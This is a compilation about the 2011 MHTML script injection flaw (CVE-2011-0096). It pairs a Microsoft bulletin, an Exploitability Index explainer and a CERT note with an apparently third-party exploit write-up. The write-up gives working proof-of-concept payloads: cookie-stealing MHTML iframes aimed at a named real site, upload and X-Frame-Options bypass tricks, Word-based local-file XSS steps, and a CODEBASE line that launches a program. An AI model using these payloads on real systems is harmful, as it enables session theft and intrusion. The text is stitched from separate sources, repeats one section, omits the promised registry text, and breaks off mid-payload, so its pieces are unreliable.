## Vulnerability in MHTML Could Allow Information Disclosure (2503658)

Published: April 12, 2011

**Version:** 1.0

### General Information

#### Executive Summary

This security update resolves a publicly disclosed vulnerability in the MHTML protocol handler in Microsoft Windows. The vulnerability could allow information disclosure if a user visited a specially crafted Web site. In a Web-based attack scenario, a Web site could contain a specially crafted link that is used to exploit this vulnerability. An attacker would have to convince users to visit the Web site and open the specially crafted link.

This security update is rated Important for all supported editions of Windows XP, Windows Vista, and Windows 7, and rated Low for all supported editions of Windows Server 2003, Windows Server 2008, and Windows Server 2008 R2. For more information, see the subsection, **Affected and Non-Affected Software**, in this section.

The security update addresses the vulnerability by correcting the way that the MHTML parser handles requests. For more information about the vulnerability, see the Frequently Asked Questions (FAQ) subsection for the specific vulnerability entry under the next section, **Vulnerability Information**.

This security update also addresses the vulnerability first described in [Microsoft Security Advisory 2501696](https://technet.microsoft.com/security/advisory/2501696).

## MHTML Mime-Formatted Request Vulnerability - CVE-2011-0096

An information disclosure vulnerability exists in the way MHTML interprets MIME-formatted requests for content blocks within a document. It is possible under certain conditions for this vulnerability to allow an attacker to run a client-side script in the wrong security context. Similar to server-side cross-site scripting (XSS) vulnerabilities, it is possible under certain conditions for this vulnerability to allow an attacker to inject a client-side script in the response to a Web request run in the context of the user's instance of Internet Explorer.

To view this vulnerability as a standard entry in the Common Vulnerabilities and Exposures list, see [CVE-2011-0096](https://www.cve.org/CVERecord?id=CVE-2011-0096).

#### Mitigating Factors for MHTML Mime-Formatted Request Vulnerability - CVE-2011-0096

Mitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation:

* In a Web-based attack scenario, a Web site could contain a specially crafted link beginning with "MHTML:" that is used to exploit this vulnerability. An attacker would have to convince users to visit the Web site and open a specially crafted URL, typically by getting them to click a link in an e-mail message or Instant Messenger message that takes users to the attacker's Web site, and then convincing them to click the specially crafted link.
* By default, all supported versions of Microsoft Outlook, Microsoft Outlook Express, and Windows Mail open HTML e-mail messages in the Restricted sites zone, which disables script and ActiveX controls, removing the risk of an attacker being able to use this vulnerability to execute malicious code. If a user clicks a link in an e-mail message, the user could still be vulnerable to exploitation of this vulnerability through the Web-based attack scenario.
* By default, Internet Explorer on Windows Server 2003 and 2008 runs in a restricted mode that is known as [Enhanced Security Configuration](https://msdn.microsoft.com/library/default.asp?url=/workshop/security/szone/overview/esc_changes.asp). This mode mitigates this vulnerability. For more information about Internet Explorer Enhanced Security Configuration, see the FAQ entry in the next subsection, "I am running Internet Explorer for Windows Server 2003, Windows Server 2008, or Windows Server 2008 R2. Does this mitigate this vulnerability?"

#### Workarounds for MHTML Mime-Formatted Request Vulnerability - CVE-2011-0096

Workaround refers to a setting or configuration change that does not correct the underlying vulnerability but would help block known attack vectors before you apply the update. Microsoft has tested the following workarounds and states in the discussion whether a workaround reduces functionality:

* **Disable the MHTML protocol handler**

  **Warning** If you use Registry Editor incorrectly, you may cause serious problems that may require you to reinstall your operating system. Microsoft cannot guarantee that you can solve problems that result from using Registry Editor incorrectly. Use Registry Editor at your own risk.

  To disable the MHTML protocol handler, follow these steps for backing up and deleting a registry key:

  1. Open the Registry Editor.
  2. Navigate to the following registry key:

     HKEY\_CLASSES\_ROOT\CLSID\{05300401-BCBC-11d0-85E3-00C04FD85AB4}
  3. Back-up the registry key by right-clicking it, selecting **Export**, and saving it as a registry file, i.e., "mhtml.reg".
  4. Delete the key from the registry by right-clicking it and selecting **Delete**.

  **Note** You can apply the exported .reg file to individual systems by copying it to a target system and double-clicking it. You can also apply it across domains using Group Policy. For more information about Group Policy, see the TechNet article, [Group Policy collection](https://go.microsoft.com/fwlink/?linkid=215719).

  **Impact of workaround.** The MHTML protocol will cease to function. Any application that uses MHTML will be affected by this workaround.

  **How to undo the workaround.** To undo this workaround, double-click the registry file you exported in step 3 above.
* **Enable the MHTML protocol lockdown**

  **Warning** If you use Registry Editor incorrectly, you may cause serious problems that may require you to reinstall your operating system. Microsoft cannot guarantee that you can solve problems that result from using Registry Editor incorrectly. Use Registry Editor at your own risk.

  **Note** See [Microsoft Knowledge Base Article 2503658](https://support.microsoft.com/kb/2503658) to use the automated **Microsoft Fix it** solution to enable and disable this workaround.

  To lockdown the MHTML protocol, paste the following text in a text editor such as Notepad. Then, save the file by using the .reg file name extension.

* **Set Internet and Local intranet security zone settings to "High" to block ActiveX Controls and Active Scripting in these zones**

  **Note** Workarounds refer to a setting or configuration change that does not correct the underlying issue but would help block known attack vectors before a security update is available. Microsoft has tested the following workaround and states in the discussion whether the workaround reduces functionality.

  You can help protect against exploitation of this vulnerability by changing your settings for the Internet security zone to block ActiveX controls and Active Scripting. You can do this by setting your browser security to High.

  To raise the browsing security level in Internet Explorer, follow these steps:

  1. On the Internet Explorer **Tools** menu, click **Internet Options**.
  2. In the **Internet Options** dialog box, click the **Security** tab, and then click the **Internet** icon.
  3. Under **Security level for this zone**, move the slider to **High**. This sets the security level for all Web sites you visit to High.

  **Note** If no slider is visible, click **Default Level**, and then move the slider to **High**.

  **Note** Setting the level to High may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly even with the security setting set to High.

  **Impact of workaround.** There are side effects to blocking ActiveX Controls and Active Scripting. Many Web sites that are on the Internet or on an intranet use ActiveX or Active Scripting to provide additional functionality. For example, an online e-commerce site or banking site may use ActiveX Controls to provide menus, ordering forms, or even account statements. Blocking ActiveX Controls or Active Scripting is a global setting that affects all Internet and intranet sites. If you do not want to block ActiveX Controls or Active Scripting for such sites, use the steps outlined in "Add sites that you trust to the Internet Explorer Trusted sites zone".

  **Add sites that you trust to the Internet Explorer Trusted sites zone**

  After you set Internet Explorer to block ActiveX controls and Active Scripting in the Internet zone and in the Local intranet zone, you can add sites that you trust to the Internet Explorer Trusted sites zone. This will allow you to continue to use trusted Web sites exactly as you do today, while helping to protect yourself from this attack on untrusted sites. We recommend that you add only sites that you trust to the Trusted sites zone.

  To do this, follow these steps:

  1. In Internet Explorer, click **Tools**, click **Internet Options**, and then click the **Security** tab.
  2. In the **Select a Web content zone to specify its current security settings** box, click **Trusted Sites**, and then click **Sites**.
  3. If you want to add sites that do not require an encrypted channel, click to clear the **Require server verification (https:) for all sites in this zone** check box.
  4. In the **Add this Web site to the zone** box, type the URL of a site that you trust, and then click **Add**.
  5. Repeat these steps for each site that you want to add to the zone.
  6. Click **OK** two times to accept the changes and return to Internet Explorer.

  **Note** Add any sites that you trust not to take malicious action on your system. Two in particular that you may want to add are **\*.windowsupdate.microsoft.com** and **\*.update.microsoft.com**. These are the sites that will host the update, and it requires an ActiveX Control to install the update.
* **Configure Internet Explorer to prompt before running Active Scripting or to disable Active Scripting in the Internet and Local intranet security zone**

  **Note** Workarounds refer to a setting or configuration change that does not correct the underlying issue but would help block known attack vectors before a security update is available. Microsoft has tested the following workaround and states in the discussion whether the workaround reduces functionality.

  You can help protect against exploitation of this vulnerability by changing your settings to prompt before running Active Scripting or to disable Active Scripting in the Internet and Local intranet security zone. To do this, follow these steps:

  1. In Internet Explorer, click **Internet Options** on the **Tools** menu.
  2. Click the **Security** tab.
  3. Click **Internet**, and then click **Custom Level**.
  4. Under **Settings**, in the **Scripting** section, under **Active Scripting**, click \*\*Prompt \*\*or **Disable**, and then click **OK**.
  5. Click **Local intranet**, and then click **Custom Level**.
  6. Under **Settings**, in the **Scripting** section, under **Active Scripting**, click \*\*Prompt \*\*or **Disable**, and then click **OK**.
  7. Click **OK** two times to return to Internet Explorer.

  **Note** Disabling Active Scripting in the Internet and Local intranet security zones may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly.

  **Impact of workaround.** There are side effects to prompting before running Active Scripting. Many Web sites that are on the Internet or on an intranet use Active Scripting to provide additional functionality. For example, an online e-commerce site or banking site may use Active Scripting to provide menus, ordering forms, or even account statements. Prompting before running Active Scripting is a global setting that affects all Internet and intranet sites. You will be prompted frequently when you enable this workaround. For each prompt, if you feel you trust the site that you are visiting, click **Yes** to run Active Scripting. If you do not want to be prompted for all these sites, use the steps outlined in "Add sites that you trust to the Internet Explorer Trusted sites zone".

  **Add sites that you trust to the Internet Explorer Trusted sites zone**

  After you set Internet Explorer to require a prompt before it runs ActiveX controls and Active Scripting in the Internet zone and in the Local intranet zone, you can add sites that you trust to the Internet Explorer Trusted sites zone. This will allow you to continue to use trusted Web sites exactly as you do today, while helping to protect you from this attack on untrusted sites. We recommend that you add only sites that you trust to the Trusted sites zone.

  To do this, follow these steps:

  1. In Internet Explorer, click **Tools**, click **Internet Options**, and then click the **Security** tab.
  2. In the **Select a Web content zone to specify its current security settings** box, click **Trusted Sites**, and then click **Sites**.
  3. If you want to add sites that do not require an encrypted channel, click to clear the **Require server verification (https:) for all sites in this zone** check box.
  4. In the **Add this Web site to the zone** box, type the URL of a site that you trust, and then click **Add**.
  5. Repeat these steps for each site that you want to add to the zone.
  6. Click **OK** two times to accept the changes and return to Internet Explorer.

  **Note** Add any sites that you trust not to take malicious action on your system. Two in particular that you may want to add are **\*.windowsupdate.microsoft.com** and **\*.update.microsoft.com**. These are the sites that will host the update, and it requires an ActiveX Control to install the update.

#### FAQ for MHTML Mime-Formatted Request Vulnerability - CVE-2011-0096

**What is the scope of the vulnerability?**

This is an information disclosure vulnerability that affects all supported releases of Microsoft Windows.

**What causes the vulnerability?**

The vulnerability is caused when MHTML interprets MIME-formatted requests for content blocks within a document, making it possible for an attacker to run script in the wrong security context (for example, some scripts could be run in the incorrect Internet Explorer security zone).

**What is MHTML?**

MHTML (MIME Encapsulation of Aggregate HTML) is an Internet standard that defines the MIME structure that is used to wrap HTML content. The MHTML protocol handler in Windows provides a [pluggable protocol](https://msdn.microsoft.com/library/aa767916%28v%3Dvs.85%29.aspx) that permits MHTML-encoded documents to be rendered in applications.

**What is cross-site scripting (XSS)?**

Cross-site scripting (XSS) is a class of security vulnerability that can enable an attacker to inject script into the response to a Web page request. This script is then run by the requesting application, often times a Web browser. The script could then spoof content, disclose information, or take any action that the user could take on the affected Web site, on behalf of the targeted user.

**What is the component affected by the vulnerability?**

The affected component is MHTML, which is used by several products, for example Outlook Express, Windows Mail, Internet Explorer, and Microsoft Office programs like Microsoft Word.

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited this vulnerability could inject a client-side script into the user's instance of Internet Explorer. The script could spoof content, disclose information, or take any action that the user could take on the affected Web site on behalf of the targeted user.

**How could an attacker exploit the vulnerability?**

Because of the way MHTML interprets MIME-formatted requests for content blocks within a document, an attacker could exploit this vulnerability by running script in the wrong security context.

**What systems are primarily at risk from the vulnerability?**

This vulnerability requires that a user be logged on and visiting a Web site for any malicious action to occur. Therefore, any systems where Internet Explorer is used frequently, such as workstations or terminal servers, are at the most risk from this vulnerability.

**I am running Internet Explorer for Windows Server 2003, Windows Server 2008, or Windows Server 2008 R2. Does this mitigate this vulnerability?**

Yes. By default, Internet Explorer on Windows Server 2003, Windows Server 2008, and Windows Server 2008 R2 runs in a restricted mode that is known as [Enhanced Security Configuration](https://technet.microsoft.com/library/dd883248%28ws.10%29.aspx). Enhanced Security Configuration is a group of preconfigured settings in Internet Explorer that can reduce the likelihood of a user or administrator downloading and running specially crafted Web content on a server. This is a mitigating factor for Web sites that you have not added to the Internet Explorer Trusted sites zone.

**I installed the Microsoft Fix it solution to enable the MHTML protocol lockdown. How will I be affected by installing this security update?**

The Microsoft Fix it solution in [Microsoft Knowledge Base Article 2503658](https://support.microsoft.com/kb/2503658) enables the lockdown of the MHTML protocol. The security update addresses the vulnerability in MHTML, but it does not reverse the lockdown of the MHTML protocol enforced by the Microsoft Fix it solution. The impact of the workaround remains in effect after the security update is installed. Users who do not want to keep the MHTML protocol in lockdown may use the Microsoft Fix it solution to disable the lockdown. For more information about the Microsoft Fix it solution, please see the Workaround entry, "Enable the MHTML protocol lockdown," in the previous subsection.

**I installed the Microsoft Fix it solution to enable the MHTML protocol lockdown. Do I need to uninstall this update prior to installing this security update?**

No. You do not need to uninstall the Microsoft Fix it solution to install the security update.

**What does the update do?**

The update addresses the vulnerability by correcting the way that the MHTML parser handles requests.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

Yes. This vulnerability has been publicly disclosed. It has been assigned Common Vulnerability and Exposure number [CVE-2011-0096](https://www.cve.org/CVERecord?id=CVE-2011-0096).

**When this security bulletin was issued, had Microsoft received any reports that this vulnerability was being exploited?**

Yes. When the security bulletin was released, Microsoft had received information that this vulnerability was being exploited.

**Does applying this security update help protect customers from the code, published publicly, that could attempt to exploit this vulnerability?**

Yes. This security update addresses the vulnerability that is currently being exploited. The vulnerability that has been addressed has been assigned the Common Vulnerability and Exposure number [CVE-2011-0096](https://www.cve.org/CVERecord?id=CVE-2011-0096).

#### Deployment Information

**Installing the Update**

When you install this security update, the installer checks whether one or more of the files that are being updated on your system have previously been updated by a Microsoft hotfix.

If you have previously installed a hotfix to update one of these files, the installer copies the RTMQFE, SP1QFE, or SP2QFE files to your system. Otherwise, the installer copies the RTMGDR, SP1GDR, or SP2GDR files to your system. Security updates may not contain all variations of these files. For more information about this behavior, see [Microsoft Knowledge Base Article 824994](https://support.microsoft.com/kb/824994).

For more information about the installer, see [Microsoft Knowledge Base Article 832475](https://support.microsoft.com/kb/832475).

#### Deployment Information

**Installing the Update**

When you install this security update, the installer checks whether one or more of the files that are being updated on your system have previously been updated by a Microsoft hotfix.

If you have previously installed a hotfix to update one of these files, the installer copies the RTMQFE, SP1QFE, or SP2QFE files to your system. Otherwise, the installer copies the RTMGDR, SP1GDR, or SP2GDR files to your system. Security updates may not contain all variations of these files. For more information about this behavior, see [Microsoft Knowledge Base Article 824994](https://support.microsoft.com/kb/824994).

For more information about the installer, see [Microsoft Knowledge Base Article 832475](https://support.microsoft.com/kb/832475).

For more information about the terminology that appears in this bulletin, such as *hotfix*, see [Microsoft Knowledge Base Article 824684](https://support.microsoft.com/kb/824684).

This security update supports the following setup switches.

| Switch | Description |
| --- | --- |
| **/help** | Displays the command-line options. |
| Setup Modes |  |
| **/passive** | Unattended Setup mode. No user interaction is required, but installation status is displayed. If a restart is required at the end of Setup, a dialog box will be presented to the user with a timer warning that the computer will restart in 30 seconds. |
| **/quiet** | Quiet mode. This is the same as unattended mode, but no status or error messages are displayed. |
| Restart Options |  |
| **/norestart** | Does not restart when installation has completed. |
| **/forcerestart** | Restarts the computer after installation and force other applications to close at shutdown without saving open files first. |
| **/warnrestart[:x]** | Presents a dialog box with a timer warning the user that the computer will restart in *x* seconds. (The default setting is 30 seconds.) Intended for use with the **/quiet** switch or the **/passive** switch. |
| **/promptrestart** | Displays a dialog box prompting the local user to allow a restart. |
| Special Options |  |
| **/overwriteoem** | Overwrites OEM files without prompting. |
| **/nobackup** | Does not back up files needed for uninstall. |
| **/forceappsclose** | Forces other programs to close when the computer shuts down. |
| **/log:path** | Allows the redirection of installation log files. |
| **/integrate:path** | Integrates the update into the Windows source files. These files are located at the path that is specified in the switch. |
| **/extract[:path]** | Extracts files without starting the Setup program. |
| **/ER** | Enables extended error reporting. |
| **/verbose** | Enables verbose logging. During installation, creates %Windir%\CabBuild.log. This log details the files that are copied. Using this switch may cause the installation to proceed more slowly. |

**Note** You can combine these switches into one command. For backward compatibility, the security update also supports many of the setup switches that the earlier version of the Setup program uses. For more information about the supported installation switches, see [Microsoft Knowledge Base Article 262841](https://support.microsoft.com/kb/262841).

# Microsoft Exploitability Index

The Microsoft Exploitability Index helps customers prioritize security update deployment by providing information on the likelihood that a vulnerability addressed in a Microsoft security update will be exploited.

## The Microsoft Exploitability Index

The Exploitability Index may help customers evaluate risk for a vulnerability. Microsoft evaluates the potential exploitability of each vulnerability associated with a Microsoft security update and then publishes the exploitability information as part of the monthly Microsoft security update details. If after publishing the details Microsoft determines that the Exploitability Index Assessment warrants a change, it will change the assessment and notify customers through technical security notifications. The company will not update the assessment when exploit code is posted that matches the existing exploitability information.

The Exploitability Index uses one of four values to communicate to customers the likelihood of a vulnerability being exploited, based on the vulnerabilities addressed by the Microsoft security update.

| Exploitability index assessment | Short definition |
| --- | --- |
| 0 | Exploitation detected |
| 1 | Exploitation more likely \* |
| 2 | Exploitation less likely \*\* |
| 3 | Exploitation unlikely \*\*\* |

### 0 – Exploitation Detected

Microsoft is aware of an instance of this vulnerability being exploited. As such, customers who have reviewed the security update and determined its applicability within their environment should treat this with the highest priority.

### 1 – Exploitation More Likely

Microsoft analysis has shown that exploit code could be created in such a way that an attacker could consistently exploit this vulnerability. Moreover, Microsoft is aware of past instances of this type of vulnerability being exploited. This would make it an attractive target for attackers, and therefore more likely that exploits could be created. As such, customers who have reviewed the security update and determined its applicability within their environment should treat this with a higher priority.

### 2 – Exploitation Less Likely

Microsoft analysis has shown that while exploit code could be created, an attacker would likely have difficulty creating the code, requiring expertise and/or sophisticated timing, and/or varied results when targeting the affected product. Moreover, Microsoft has not recently observed a trend of this type of vulnerability being actively exploited in the wild. This makes it a less attractive target for attackers. That said, customers who reviewed the security update and determined its applicability within their environment should still treat this as a material update. If they are prioritizing against other highly exploitable vulnerabilities, they could rank this lower in their deployment priority.

### 3 – Exploitation Unlikely

Microsoft analysis shows that successfully functioning exploit code is unlikely to be utilized in real attacks. This means that while it might be possible for exploit code to be released that could trigger the vulnerability and cause abnormal behavior, the full impact of exploitation will be more limited. Moreover, Microsoft has not observed instances of this type of vulnerability being actively exploited in the past. Thus, the actual risk of being exploited from this vulnerability is significantly lower. Therefore, customers who have reviewed the security update to determine its applicability within their environment could prioritize this update below other vulnerabilities within a release.

In those scenarios where multiple product series are affected, for instance a vulnerability that affects both Windows and Office, the rating reflects the highest risk level across both products. Likewise, the rating reflects the highest risk present across all versions of the product.  In this case, if the Exploitability Assessment on the latest version of Office is "1," and on the latest version of Windows is "2," the rating will reflect "1."  If the XI rating for Windows 10 version 2004 is “2” and the rating for Windows 7 is “1”, the rating will reflect “1”.

## Important Terms and Definitions

**Exploit Code** – A software program or sample code that, when executed against a vulnerable system, uses the vulnerability to spoof attacker identity, tamper with user or system information, repudiate attacker action, disclose user or system information on the server side, deny service to valid users, or elevate privileges for the attacker. For example, if a vulnerability had a security impact of remote code execution, Exploit Code could cause remote code execution to occur when run against a target system.

**Trigger a Vulnerability** – The ability to reach the vulnerable code, but not always achieving the maximum impact. For example, it may be easy to trigger a remote code execution vulnerability, but the resulting effect may only be a denial of service.

* ### What is the Microsoft Exploitability Index?

  The Microsoft Exploitability Index provides additional information to help customers prioritize their deployment of the monthly security updates. Microsoft designed this index to provide customers guidance concerning the likelihood of exploitation, based on each vulnerability addressed by Microsoft security updates.
* ### Why did Microsoft create the Exploitability Index?

  Customers asked for more information to help them prioritize their deployment of Microsoft security updates each month, specifically requesting details about the likelihood of exploitation for the vulnerabilities addressed in security updates. The Exploitability Index provides guidance about the actual risk of exploitation of a vulnerability at the time of the security update’s release.
* ### How are vulnerabilities rated?

  Microsoft Exploitability Index focuses on two aspects of a vulnerability to build its ratings:
  1. Current exploitation trends, based on telemetry data and awareness of exploitation of a particular type of vulnerability in a particular product,
  2. The cost and reliability of building a working exploit for the vulnerability, based on a technical analysis of the vulnerability.
* ### Is this a truly reliable rating system?

  While reliably predicting activity within the security ecosystem is always difficult, there are three reasons why this system should be useful. First, over the last few years we have realized that many security researchers analyze the updates associated with Microsoft's security updates the day they are released to create and evaluate protections. In doing so, many of these researchers also create exploit code to test them. The methodology used to develop this exploit code is like the one Microsoft uses to determine the likelihood of exploit code release. Microsoft analyzes the updates themselves, the nature of the vulnerability, and the conditions that must be met for an exploit to execute successfully. Second, not all vulnerabilities resolved by our security updates are exploited. A vulnerability may well be technically exploitable with a high degree of reliability, but it may never be exploited. We continuously monitor and track exploitation activity to keep up to date with current trends. This in turn informs our opinion of what constitutes a more attractive vulnerability over similar vulnerabilities, and enables us to more accurately communicate an actual risk, rather than a potential one from the vulnerabilities we patch.
  Finally, we are also partnering with protection providers through the Microsoft Active Protections Program (MAPP), working with them to help validate our predictions each month – thereby using a community approach to ensure better accuracy through information sharing.
* ### How is the Exploitability Index different from the Security Update Severity Rating system?

  The Security Update Severity Rating System assumes that exploitation will be successful. For some vulnerabilities where exploitability is high, this assumption is very likely to be true for a broad set of attackers. For other vulnerabilities where exploitability is low, this assumption may only be true when a dedicated attacker puts a lot of resources into ensuring their attack is successful. Regardless of the Severity or Exploitability Index rating, Microsoft always recommends that customers deploy all applicable and available updates; however, this rating information can assist sophisticated customers in prioritizing their approach to each month's release.
* ### How are Denial of Service, Tampering, Information Disclosure, or Spoofing issues rated?

  The Exploitability Index does not differentiate between vulnerability types. It focuses on the likelihood of exploitation of each vulnerability within the range of their full impact potential. Thus, any vulnerability, whether it is Remote Code Execution, Tampering or other, could be rated any of the Exploitability Index ratings.
* ### What happens when newly emerging information requires an update to the Exploitability Index rating?

  The ability to rate the possible exploitation of vulnerabilities is an evolving science, and new techniques for exploitation in general, or unique techniques specific to a vulnerability, or new trends in detected exploits of particular products may be discovered that could change the Exploitability Index rating. However, the goal of the Exploitability Index is to help customers prioritize those updates for the most current monthly release. Therefore, if there is information that would change an assessment released in the first month of a security release, Microsoft will update the Exploitability Index. If information becomes available in subsequent months, after most customers have made their prioritization decisions, the Exploitability Index will not be updated as it is no longer useful to the customer. When an Exploitability Index rating is corrected in a way that reflects increased risk to customers, the security update revision is incremented at a major version number (for instance, from 1.0 to 2.0). When risk is adjusted downwards, the update revision is incremented at a minor version number (for instance, from 1.0 to 1.1).
* ### How does the Exploitability Index relate to the Common Vulnerability Scoring System (CVSS) and other rating systems?

  The Exploitability Index is separate and not related to other rating systems. However, the MSRC is a contributing member to the Common Vulnerability Scoring System (CVSS), and Microsoft shares its experience and customer feedback in building and releasing the Exploitability Index with the working group in order to help ensure the CVSS is effective and actionable.

Hacking with mhtml protocol handler

Author: www.80vul.com [Email:5up3rh3i#gmail.com]
Release Date: 2011/1/15
References: http://www.80vul.com/mhtml/Hacking%20with%20mhtml%20protocol%20handler.txt

Ph4nt0m Webzine 0x05 (http://secinn.appspot.com/pstzine) Was finally released yesterday, There are two articles about the browser security[0x05 and 0x06].If the combination of both, we can complete a lot of interesting attacks...

1.Cross Site Scripting by upload mhtml file

Using the mhtml protocol handler,The file extension is ignored.so the attacker use renname the  mhtml file to a *.jpg file,etc. then upload it to the target site...

ofcouser ,we can use "copy /b 1.jpg + 1.mhtml 2.jpg" to bypass some upload file format security restrictions

then use iframe tag src to it:

<iframe src="MHTML:http://target-site.com/upfile/demo.html!cookie"></iframe>

2.Cross Site Scripting mhtml-file string injection

the mhtml-file format is only base on CRLF,so if we can injection CRLF, the site may be attacked.

poc:

test it on win7 system pls.

<iframe src="mhtml:http://www.tudou.com/my/channel/item.srv?icode=enQCgQKJTDs&callback=Content-Type%3A%20multipart%2Frelated%3B%20boundary%3D_boundary_by_mere%0D%0A%0D%0A--_boundary_by_mere%0D%0AContent-Location%3Acookie%0D%0AContent-Transfer-Encoding%3Abase64%0D%0A%0D%0APGJvZHk%2BDQo8aWZyYW1lIGlkPWlmciBzcmM9Imh0dHA6Ly93d3cuODB2dWwuY29tLyI%2BPC9pZnJhbWU%2BDQo8c2NyaXB0Pg0KYWxlcnQoZG9jdW1lbnQuY29va2llKTsNCmZ1bmN0aW9uIGNyb3NzY29va2llKCl7DQppZnIgPSBpZnIuY29udGVudFdpbmRvdyA%2FIGlmci5jb250ZW50V2luZG93IDogaWZyLmNvbnRlbnREb2N1bWVudDsNCmFsZXJ0KGlmci5kb2N1bWVudC5jb29raWUpDQp9DQpzZXRUaW1lb3V0KCJjcm9zc2Nvb2tpZSgpIiwxMDAwKTsNCjwvc2NyaXB0PjwvYm9keT4NCg%3D%3D%0D%0A--_boundary_by_mere--%0D%0A!cookie"></iframe>

if win-xp or win2k3 system,pls do it by the second urlencode.

mhtml-file string injection in JOSN file, some sites restrict the JOSN file's Content-Type to defense xss. maybe we can use mhtml-file string injection to pass it :)

3.bypass X-Frame-Options

X-Frame-Options did not protect the mhtml protocol handler.

the demo:

<iframe src="mhtml:http://www.80vul.com/mhtml/zz.php!cookie"></iframe>
<iframe src="http://www.80vul.com/mhtml/zz.php"></iframe>

4.mhtml+file://uncpath+Adobe Reader 9 == local xss vul

Billy (BK) Rios introduced a very interesting approach to Steal local files on the RuxCon/Baythreat(https://xs-sniper.com/blog/2010/12/17/will-it-blend/) ,it used  "Script src to local files in the LocalLow directory" by file:// +java apple +Adobe Reader+Adobe flash to complete it. but if used mhtml+file://uncpath, so easy to do it.

Demo:

test it on win2k3+ie8+Adobe Reader 9

http://www.80vul.com/hackgame/xs-g0.php?username=Administrator

5.mhtml+file://uncpath+word == local xss vul

demo:http://www.80vul.com/mhtml/word.doc

download it, and save it on c:\word.doc and open it. u can get the alert c:\boot.ini 's content.

this is base on "Microsoft word javascript execution"(http://marc.info/?l=bugtraq&m=121121432823704&w=2).

to make the proof of concept follow the following steps:

1-Make a html file and paste xss code
2-Open the html file with the word and save as c:\word.xml
3-Open the word.xml with the notepad,and inject the mhtml code in <w:t>aaaaa </w:t>
4-Rename c:\word.xml to c:\word.doc
5-Open c:\word.doc file

xss code
---------------------------------------------------------
<html><OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=http://www.80vul.com/hackgame/word.htm></OBJECT>
aaaaa
----------------------------------------------------------

mhtml code
--------------------------------------------------------
/*
Content-Type: multipart/related; boundary="_boundary_by_mere":

--_boundary_by_mere--

*/
--------------------------------------------------------

if u use this vul to attack someone,u need to known the word file path where save the download file. and lots of guns used on the desktop :)

"Microsoft word javascript execution" is only work on office 2k3 and 2k7, In other versions u can make the link, and src to http://www.80vul.com/hackgame/word.htm

update
ofcouse ,this way maybe work on anoher file type like:*.pdf by app.launchURL()

6. Coss Zone Scripting

First we would like to mention a very old vulnerability:

<OBJECT CLASSID=CLSID:12345678-1234-4321-1234-111111111111 CODEBASE=c:/winnt/system32/calc.exe></OBJECT>

This vulnerability (by firebug9[http://hi.baidu.com/firebug9/blog/item/b7627c4624cd880f6a63e5e7.html]) allows you to execute any program on "My Computer" zone,Been tested and found to this vul work on ie6/ie7/ie8+win2k/winxp/win2k3

Then repeat "5.mhtml+file://uncpath+word == local xss vul" steps and change:

xss code
---------------------------------------------------------
<html><OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=mhtml:file://c:/word.doc!cookie></OBJECT>
aaaaa
----------------------------------------------------------

mhtml code
--------------------------------------------------------
/*
Content-Type: multipart/related; boundary="_boundary_by_mere":

--_boundary_by_mere
Content-Location:cookie
Content-Transfer-Encoding:base64

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## Microsoft Windows MHTML script injection vulnerability

#### Vulnerability Note VU#326549

Original Release Date: 2011-01-28 | Last Revised: 2011-04-12

---

### Overview

Microsoft Windows contains an script injection vulnerability in the MHTML protocol handler, which may allow an attacker to execute arbitrary script within the context of another website domain.

### Description

| Microsoft Windows contains a script injection vulnerability caused by the way MHTML interprets MIME-formatted requests for content blocks within a document. According to Microsoft TechNet Security Research & Defense [blog](http://blogs.technet.com/srd/): "*It is possible under certain conditions for this vulnerability to allow an attacker to inject a client-side script in the response of a Web request run in the context of the victim's Internet Explorer. The script could spoof content, disclose information, or take any action that the user could take on the affected Web site on behalf of the targeted user.*" |
| --- |

### Impact

| By convincing a user to view a specially crafted HTML document (e.g., a web page or an HTML email message), an attacker may be able to obtain access to web content in another domain. The impact is similar to that of a cross-site scripting vulnerability. For a more detailed description of the impact of cross-site scripting vulnerabilities, please see CERT Advisory [CA-2000-02](http://www.cert.org/advisories/CA-2000-02.html#impact). |
| --- |

